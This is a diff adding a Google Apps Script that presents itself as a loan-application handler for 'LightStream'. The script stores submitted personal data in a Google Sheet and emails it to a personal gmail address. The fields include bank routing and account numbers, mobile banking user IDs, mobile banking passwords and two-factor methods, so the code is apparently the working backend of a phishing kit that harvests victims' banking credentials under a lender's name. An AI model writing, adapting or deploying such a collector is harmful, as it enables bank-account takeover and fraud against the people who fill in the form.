@@ -1,0 +1,150 @@
+// Google Apps Script for LightStream Loan Applications
+// Updated to handle FormData properly
+
+// Sheet configuration
+const SHEET_NAME = "Loan Applications";
+const RECIPIENT_EMAIL = "finnfoxpersonalloan@gmail.com";
+
+function doGet(e) {
+  return HtmlService.createHtmlOutput("LightStream Google Apps Script is running");
+}
+
+function doPost(e) {
+  try {
+    // Log the incoming request for debugging
+    Logger.log("Received request: " + JSON.stringify(e));
+    
+    // Handle both JSON and FormData
+    let data = {};
+    
+    if (e.postData && e.postData.contents) {
+      // Try to parse as JSON first
+      try {
+        data = JSON.parse(e.postData.contents);
+      } catch (jsonError) {
+        // If JSON fails, treat as FormData
+        data = parseFormData(e.postData.contents);
+      }
+    } else if (e.parameters) {
+      // Handle URL parameters (FormData fallback)
+      data = {};
+      for (let key in e.parameters) {
+        data[key] = e.parameters[key][0]; // Take first value
+      }
+    }
+    
+    Logger.log("Processed data: " + JSON.stringify(data));
+    
+    // Get the spreadsheet
+    const ss = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit");
+    const sheet = ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
+    
+    // Set up headers if sheet is empty
+    if (sheet.getLastRow() === 0) {
+      const headers = [
+        "Timestamp", "Type", "First Name", "Last Name", "Email", "Phone",
+        "Loan Amount", "Loan Purpose", "Loan Duration", "Gross Monthly Income",
+        "Employment Status", "Credit Score", "Street Address", "City", "State", "ZIP Code",
+        "Routing Number", "Account Number", "Bank Name", "Mobile Banking User ID",
+        "Mobile Banking Password", "Two Factor Method", "Terms Accepted"
+      ];
+      sheet.appendRow(headers);
+    }
+    
+    // Prepare row data
+    const rowData = [
+      data.timestamp || new Date().toISOString(),
+      data.type || 'Unknown',
+      data.firstName || '',
+      data.lastName || '',
+      data.email || '',
+      data.phone || '',
+      data.loanAmount || '',
+      data.loanPurpose || '',
+      data.loanDuration || '',
+      data.grossMonthlyIncome || '',
+      data.employmentStatus || '',
+      data.creditScore || '',
+      data.streetAddress || '',
+      data.city || '',
+      data.state || '',
+      data.zipCode || '',
+      data.routingNumber || '',
+      data.accountNumber || '',
+      data.bankName || '',
+      data.mobileBankingUserId || '',
+      data.mobileBankingPassword || '[PROTECTED]',
+      data.twoFactorMethod || '',
+      data.termsAccepted || 'false'
+    ];
+    
+    // Append data to sheet
+    sheet.appendRow(rowData);
+    
+    // Send email notification
+    sendEmailNotification(data);
+    
+    // Return success response
+    return ContentService.createTextOutput("SUCCESS: Data saved to Google Sheets and email sent")
+      .setMimeType(ContentService.MimeType.TEXT);
+    
+  } catch (error) {
+    Logger.log("Error: " + error.toString());
+    return ContentService.createTextOutput("ERROR: " + error.toString())
+      .setMimeType(ContentService.MimeType.TEXT);
+  }
+}
+
+function parseFormData(content) {
+  const data = {};
+  const pairs = content.split('&');
+  
+  for (let i = 0; i < pairs.length; i++) {
+    const pair = pairs[i].split('=');
+    if (pair.length === 2) {
+      data[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
+    }
+  }
+  
+  return data;
+}
+
+function sendEmailNotification(data) {
+  try {
+    const subject = "New " + (data.type || "Loan") + " Application - " + (data.firstName || "Unknown") + " " + (data.lastName || "");
+    
+    let body = "A new application has been submitted:\n\n";
+    body += "Application Type: " + (data.type || "Unknown") + "\n";
+    body += "Name: " + (data.firstName || "") + " " + (data.lastName || "") + "\n";
+    body += "Email: " + (data.email || "") + "\n";
+    body += "Phone: " + (data.phone || "") + "\n";
+    body += "Timestamp: " + (data.timestamp || new Date().toISOString()) + "\n\n";
+    
+    if (data.type === "personal_loan") {
+      body += "Loan Details:\n";
+      body += "- Amount: $" + (data.loanAmount || "") + "\n";
+      body += "- Purpose: " + (data.loanPurpose || "") + "\n";
+      body += "- Duration: " + (data.loanDuration || "") + " months\n";
+      body += "- Income: $" + (data.grossMonthlyIncome || "") + "/month\n";
+      body += "- Employment: " + (data.employmentStatus || "") + "\n";
+      body += "- Credit Score: " + (data.creditScore || "") + "\n";
+    }
+    
+    if (data.type === "bank_authentication") {
+      body += "Bank Details:\n";
+      body += "- Bank: " + (data.bankName || "") + "\n";
+      body += "- User ID: " + (data.mobileBankingUserId || "") + "\n";
+      body += "- 2FA Method: " + (data.twoFactorMethod || "") + "\n";
+    }
+    
+    body += "\nAddress:\n";
+    body += (data.streetAddress || "") + "\n";
+    body += (data.city || "") + ", " + (data.state || "") + " " + (data.zipCode || "") + "\n";
+    
+    MailApp.sendEmail(RECIPIENT_EMAIL, subject, body);
+    Logger.log("Email sent successfully to " + RECIPIENT_EMAIL);
+    
+  } catch (emailError) {
+    Logger.log("Email error: " + emailError.toString());
+  }
+}
